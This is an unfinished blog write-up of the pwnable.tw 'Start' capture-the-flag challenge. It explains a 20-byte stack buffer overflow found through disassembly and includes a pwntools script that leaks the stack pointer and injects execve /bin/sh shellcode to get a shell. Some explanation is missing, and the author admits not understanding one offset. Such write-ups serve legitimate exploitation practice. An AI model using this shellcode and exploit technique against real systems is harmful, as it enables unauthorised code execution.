---
layout: post
title: '[Unfinished]Pwnable.tw: Start'
published: true
---
First, we check file info: 

![Capture.PNG]({{site.baseurl}}/img/ctf/pwnable.tw/Capture.PNG)


It's a .elf file. Now we should open disassembler like IDA Pro.
![assembly.PNG]({{site.baseurl}}/img/ctf/pwnable.tw/assembly.PNG)

We have two funcion: `_start` and `_exit`.
As you can see, it firsts push esp, and push address `_exit` fuction, then push 5 times hex numbers. If you look closer by convert it to string, that's the string "Let's start the CTF:" at the beginning of the program. 

_**`int 80` is a system call in Linux, you can read it more at [here](http://asm.sourceforge.net/syscall.html).
It depends on the number before to make a move. E.g: the number before first instruction `int 80` at `0804808F` is 4, it means [sys_write](http://asm.sourceforge.net/syscall.html#4); the number before the second is 3, it is [sys_read](http://asm.sourceforge.net/syscall.html#3).**_

The program lets you type 60 bytes, but it only accepts 20 bytes. Therefore, you can see maybe has buffer overflow here.

First payload I use buffer overflow to make it returns to ......

And then It will print out esp address in stack. Having address, I can put the shellcode into that.
\[Méo biết tại sao lại cộng 20 nữa, làm bài khác rồi quay lại vậy]
Source code for pwn:
{% highlight python linenos %}
from pwn import *

  conn = remote("chall.pwnable.tw", 10000)
  conn.recv(20)

  shellcode = "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80"

  payload = 'A'* 20 + p32(0x08048087)
  conn.send(payload)
  esp_add = conn.recv(20)

  esp_add = u32(esp_add[0:4])

  payload = 'A' * 20 + p32(esp_add + 20) + shellcode
  conn.send(payload)

  conn.interactive()
  conn.close()
{% endhighlight %}

{: .box-note}
**Note:** Payload 1: "aaaaaaaaaaaaaaaaaaaa\x87\x80\x04\x08"
